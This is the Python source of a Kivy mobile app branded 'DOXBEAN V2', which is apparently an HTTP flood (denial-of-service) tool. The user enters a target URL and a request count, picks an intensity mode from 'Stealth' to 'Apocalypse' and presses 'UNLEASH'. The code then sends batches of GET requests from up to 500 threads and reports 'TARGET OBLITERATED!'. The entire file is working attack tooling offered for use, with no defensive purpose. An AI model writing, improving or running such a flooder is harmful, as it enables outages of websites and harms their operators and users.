

from kivy.lang import Builder
from kivymd.app import MDApp
from kivymd.uix.button import MDRectangleFlatButton
from kivymd.uix.textfield import MDTextField
from kivymd.uix.label import MDLabel
from kivymd.uix.progressbar import MDProgressBar
from kivymd.uix.list import OneLineListItem
from kivy.core.window import Window
from kivy.clock import Clock, mainthread
from kivy.metrics import dp, sp
import requests
import threading
import time
import concurrent.futures

Window.clearcolor = (0,0,0,1)

KV = '''
MDBoxLayout:
    orientation: "vertical"
    padding: dp(20)
    spacing: dp(12)
    md_bg_color: 0,0,0,1

    MDLabel:
        text: "DEFAULT V2"
        font_size: sp(40)
        halign: "center"
        text_color: 1,0,0,1

    AsyncImage:
        source: "logo.png"
        size_hint_y: None
        height: dp(180)

    MDTextField:
        id: url
        hint_text: "target"
        

    MDTextField:
        id: req
        hint_text: "requests"
        
        input_filter: "int"

    MDLabel:
        text: "MODE:"
        text_color: 1,0.2,0,1
        font_size: sp(20)

    MDRectangleFlatButton:
        text: app.mode
        on_release: app.change_mode()
        md_bg_color: 0.3,0,0,1
        font_size: sp(22)
        height: dp(60)

    MDProgressBar:
        id: bar
        value: 0

    MDRectangleFlatButton:
        text: "UNLEASH"
        on_release: app.go()
        md_bg_color: 0.5,0,0,1
        font_size: sp(30)
        height: dp(80)

    MDRectangleFlatButton:
        text: "STOP"
        on_release: app.stop()
        md_bg_color: 0.7,0,0,1

    ScrollView:
        MDList:
            id: log
'''

class DoxApp(MDApp):
    def build(self):
        self.theme_cls.theme_style = "Dark"
        self.theme_cls.primary_palette = "Red"
        self.modes = ["Stealth", "Rage", "Overkill", "Apocalypse"]
        self.mode = "Rage"
        return Builder.load_string(KV)

    def on_start(self):
        self.engine = Attack(self)
        self.log("DOXBEAN V2 READY! MODE: RAGE")

    def change_mode(self):
        i = self.modes.index(self.mode) + 1
        if i >= len(self.modes): i = 0
        self.mode = self.modes[i]
        self.root.ids.log.clear_widgets()
        self.log(f"MODE CHANGED → {self.mode}")
        self.root.children[5].text = self.mode  # آپدیت دکمه

    def go(self):
        if hasattr(self, 't') and self.t.is_alive():
            self.log("ALREADY FIRING!")
            return
        self.root.ids.log.clear_widgets()
        self.engine.run = True
        self.engine.sent = 0
        self.engine.mode = self.mode
        self.t = threading.Thread(target=self.engine.attack, daemon=True)
        self.t.start()

    def stop(self):
        self.engine.run = False
        self.log("STOPPED!")

    @mainthread
    def log(self, msg):
        self.root.ids.log.add_widget(OneLineListItem(text=msg, text_color=[1,0.4,0.4,1]))

class Attack:
    def __init__(self, app):
        self.app = app
        self.run = True
        self.sent = 0
        self.total = 100000

    @mainthread
    def log(self, txt):
        self.app.log(txt)

    @mainthread
    def prog(self, p):
        self.app.root.ids.bar.value = p

    def send(self, url):
        try:
            requests.get(url, timeout=2)
            return True
        except:
            return False

    def attack(self):
        url = self.app.root.ids.url.text.strip()
        self.total = int(self.app.root.ids.req.text or 10000)
        mode = self.app.mode

        delays = {
            "Stealth": 0.8,
            "Rage": 0.3,
            "Overkill": 0.08,
            "Apocalypse": 0.02
        }
        delay = delays[mode]
        workers = 90 if mode == "Apocalypse" else 500

        self.log(f"[FIRE] {mode} | {self.total} REQ | {workers} THREADS")
        self.prog(0)

        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as exe:
            for i in range(0, self.total, workers):
                if not self.run: break
                batch = [url] * min(workers, self.total - i)
                results = list(exe.map(self.send, batch))
                ok = sum(results)
                self.sent += ok
                self.log(f"Sent: {self.sent}")
                self.prog(self.sent / self.total * 100)
                time.sleep(delay)

        status = "TARGET OBLITERATED!" if self.run else "STOPPED"
        self.log(f"[===] {status}")
        self.prog(100 if self.run else 0)

DoxApp().run()